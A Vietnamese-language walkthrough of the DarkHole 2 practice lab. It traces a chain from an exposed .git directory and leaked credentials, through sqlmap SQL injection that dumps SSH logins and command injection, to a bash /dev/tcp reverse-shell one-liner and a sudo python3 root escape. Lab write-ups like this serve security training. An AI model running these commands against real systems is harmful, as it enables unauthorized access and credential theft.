# Security Assessment Report – DarkHole 2

## 1. Reconnaissance – Quét cổng dịch vụ

Sử dụng Nmap để xác định các cổng đang mở trên máy mục tiêu, từ đó nhận diện các dịch vụ có thể được kiểm tra trong quá trình đánh giá bảo mật.

![img](img/nmap.png?raw=true)

Kết quả cho thấy hai cổng đang mở là **22/SSH** và **80/HTTP**. Ngoài ra, quá trình quét còn phát hiện đường dẫn `.git` trên máy chủ web. Đây có thể là dấu hiệu cho thấy thư mục quản lý phiên bản Git đã bị công khai và có nguy cơ làm lộ mã nguồn ứng dụng.

## 2. Web Enumeration – Khảo sát ứng dụng web

Truy cập dịch vụ HTTP tại cổng 80 để kiểm tra giao diện và các chức năng được cung cấp bởi ứng dụng.

![img](img/port80.png?raw=true)

Ứng dụng có trang đăng nhập nhưng chưa có thông tin xác thực hợp lệ. Sau khi sử dụng Gobuster để dò tìm các đường dẫn phổ biến mà không phát hiện thêm tài nguyên đáng chú ý, quá trình kiểm tra được chuyển sang đường dẫn `.git` đã phát hiện trước đó.

![img](img/.git.png?raw=true)

## 3. Information Disclosure – Lộ mã nguồn Git

Thư mục `.git` bị công khai cho phép truy cập các dữ liệu liên quan đến kho mã nguồn. Sử dụng `git-dumper` để tải dữ liệu về môi trường phân tích, sau đó kiểm tra lịch sử commit bằng lệnh:

```bash
git log --oneline --all
```

![img](img/log.png?raw=true)

Lịch sử commit cho thấy tệp `login.php` từng chứa thông tin xác thực được viết trực tiếp trong mã nguồn. Để xem chi tiết các thay đổi, sử dụng:

```bash
git log -p --all -- login.php
```

![img](img/log1.png?raw=true)

Thông tin email và mật khẩu được phát hiện trong phiên bản mã nguồn cũ. Đây là một trường hợp **lộ thông tin xác thực qua lịch sử Git**. Việc xóa thông tin khỏi phiên bản hiện tại không loại bỏ dữ liệu đó khỏi lịch sử commit.

Sử dụng thông tin thu được để đăng nhập vào ứng dụng web.

![img](img/login_success.png?raw=true)

## 4. SQL Injection – Khai thác lỗ hổng SQL Injection

Sau khi đăng nhập thành công, quá trình kiểm tra tập trung vào tham số `id` trên trang `dashboard.php`. Việc tham số này được sử dụng trong truy vấn cơ sở dữ liệu có thể dẫn đến SQL Injection nếu ứng dụng xây dựng câu lệnh SQL không an toàn.

Để kiểm tra hành vi của máy chủ, sử dụng Burp Suite gửi các giá trị đầu vào khác nhau, bao gồm dấu nháy đơn và các điều kiện đúng/sai.

![img](img/send'.png?raw=true)

![img](img/senđktrue.png?raw=true)

Khi gửi dấu nháy đơn, máy chủ trả về HTTP 500. Trong khi đó, các yêu cầu chứa điều kiện `AND 1=1` và `AND 1=2` trả về HTTP 200. Những khác biệt này là dấu hiệu cần kiểm tra thêm, nhưng riêng mã trạng thái HTTP chưa đủ để kết luận có SQL Injection.

Tiếp theo, sử dụng SQLmap để tự động kiểm tra tham số `id`:

```bash
sqlmap -u "http://192.168.196.131/dashboard.php?id=1" \
  --cookie="PHPSESSID=ntrcs7gkhsobhh5i19e4fon465" \
  --batch
```

![img](img/sqli.png?raw=true)

Kết quả cho thấy SQLmap phát hiện khả năng khai thác SQL Injection. Công cụ ghi nhận phản hồi trễ khi thử nghiệm biểu thức `SLEEP(5)` và xác định có thể sử dụng kỹ thuật `UNION-based SQL Injection`. Kết quả kiểm tra cho biết truy vấn có sáu cột phù hợp trong ngữ cảnh khai thác được phát hiện.

### Truy xuất thông tin cơ sở dữ liệu

Sử dụng SQLmap để liệt kê các cơ sở dữ liệu:

```bash
sqlmap -u "http://192.168.196.131/dashboard.php?id=1" \
  --cookie="PHPSESSID=ntrcs7gkhsobhh5i19e4fon465" \
  --batch --dbs
```

![img](img/--dbs.png?raw=true)

Cơ sở dữ liệu `darkhole_2` được phát hiện. Tiếp tục liệt kê các bảng:

```bash
sqlmap -u "http://192.168.196.131/dashboard.php?id=1" \
  --cookie="PHPSESSID=ntrcs7gkhsobhh5i19e4fon465" \
  -D darkhole_2 --batch --tables
```

![img](img/darkhole.png?raw=true)

Kết quả cho thấy hai bảng `ssh` và `users`. Tiến hành kiểm tra cấu trúc bảng `ssh`:

```bash
sqlmap -u "http://192.168.196.131/dashboard.php?id=1" \
  --cookie="PHPSESSID=ntrcs7gkhsobhh5i19e4fon465" \
  -D darkhole_2 -T ssh --batch --columns
```

Sau khi xác định được hai cột `user` và `pass`, sử dụng lệnh sau để trích xuất dữ liệu:

```bash
sqlmap -u "http://192.168.196.131/dashboard.php?id=1" \
  --cookie="PHPSESSID=ntrcs7gkhsobhh5i19e4fon465" \
  -D darkhole_2 -T ssh -C user,pass --dump
```

![img](img/dumpssh.png?raw=true)

Thông tin đăng nhập SSH được lưu trong bảng `ssh` đã bị lộ thông qua lỗ hổng SQL Injection. Điều này cho thấy lỗ hổng không chỉ ảnh hưởng đến dữ liệu của ứng dụng mà còn có thể tạo điều kiện để truy cập trực tiếp vào hệ điều hành.

## 5. Initial Access – Truy cập máy chủ qua SSH

Sử dụng thông tin xác thực thu được để đăng nhập vào máy chủ qua SSH với tài khoản `jehad`.

![img](img/ssh_success.png?raw=true)

Sau khi truy cập thành công, tiến hành kiểm tra các thư mục và quyền truy cập để tìm kiếm tệp chứa user flag. Tệp `user.txt` được tìm thấy trong thư mục của người dùng `losy`.

![img](img/user_flag.png?raw=true)

Việc tìm thấy tệp flag xác nhận đã đạt được mục tiêu user-level trong bài thực hành.

## 6. Privilege Escalation – Từ jehad lên losy

Tài khoản `jehad` không có quyền thực thi lệnh bằng `sudo` theo kết quả kiểm tra ban đầu. Do đó, sử dụng LinPEAS để rà soát các cấu hình, tiến trình và quyền truy cập có khả năng hỗ trợ leo thang đặc quyền.

![img](img/linpeas.png?raw=true)

Quá trình rà soát phát hiện ứng dụng trong thư mục `/opt/web` đang chạy trên `localhost:9999` dưới quyền người dùng `losy`. Thông tin về cron và ứng dụng được kiểm tra thêm để xác định cách dịch vụ được khởi chạy.

![img](img/indexphp.png?raw=true)

Qua kiểm tra mã nguồn, phát hiện tham số `cmd` được sử dụng để thực thi lệnh hệ thống mà không được kiểm soát an toàn. Đây là dấu hiệu của lỗ hổng **OS Command Injection**.

Gửi yêu cầu đến dịch vụ cục bộ với tham số `cmd=id` để xác minh khả năng thực thi lệnh:

![img](img/cmdi.png?raw=true)

Kết quả xác nhận lệnh hệ thống được thực thi thành công. Do ứng dụng chạy dưới quyền `losy`, việc khai thác lỗ hổng này cho phép thực thi lệnh với quyền của tài khoản đó.

Tiếp theo, trong môi trường lab, thiết lập trình lắng nghe và gửi payload reverse shell đến máy kiểm thử:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.196.128/1234 0>&1'
```

Payload được mã hóa URL trước khi gửi qua tham số của ứng dụng.

![img](img/reverseshelllosy.png?raw=true)

Kết quả cho thấy reverse shell được thiết lập thành công dưới quyền người dùng `losy`.

## 7. Privilege Escalation – Từ losy lên root

Sau khi có shell dưới quyền `losy`, kiểm tra các quyền `sudo` được cấp cho tài khoản này.

![img](img/sudo-llosy.png?raw=true)

Quá trình kiểm tra yêu cầu mật khẩu của `losy`. Tiếp tục kiểm tra tệp lịch sử lệnh `.bash_history` và phát hiện thông tin có thể sử dụng để xác thực.

![img](img/historylosy.png?raw=true)

Sử dụng thông tin tìm được để xác thực và kiểm tra lại quyền `sudo`.

![img](img/sudo%20-l_success.png?raw=true)

Kết quả cho thấy người dùng `losy` có thể thực thi `python3` bằng `sudo` mà không cần nhập mật khẩu. Do Python có khả năng gọi các chương trình hệ thống, cấu hình này có thể bị lạm dụng để mở shell với quyền root.

Trong môi trường lab, thực hiện lệnh:

```bash
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
```

![img](img/root.png?raw=true)

Lệnh thực thi `/bin/sh` thông qua Python với quyền được cấp bởi `sudo`, dẫn đến việc có được shell root. Sau đó, truy cập tệp `root.txt` để hoàn thành bài thực hành.

![img](img/root_flag.png?raw=true)

## 8. Attack Chain – Chuỗi khai thác

Quá trình khai thác có thể tóm tắt như sau:

```text
Quét cổng bằng Nmap
        |
        v
Phát hiện thư mục .git bị công khai
        |
        v
Tải mã nguồn và kiểm tra lịch sử Git
        |
        v
Thu thập thông tin xác thực từ login.php
        |
        v
Đăng nhập ứng dụng web
        |
        v
SQL Injection tại tham số id
        |
        v
Trích xuất thông tin SSH từ database
        |
        v
SSH vào tài khoản jehad
        |
        v
Command Injection tại dịch vụ localhost:9999
        |
        v
Reverse shell dưới quyền losy
        |
        v
Lạm dụng quyền sudo với Python
        |
        v
Root shell
```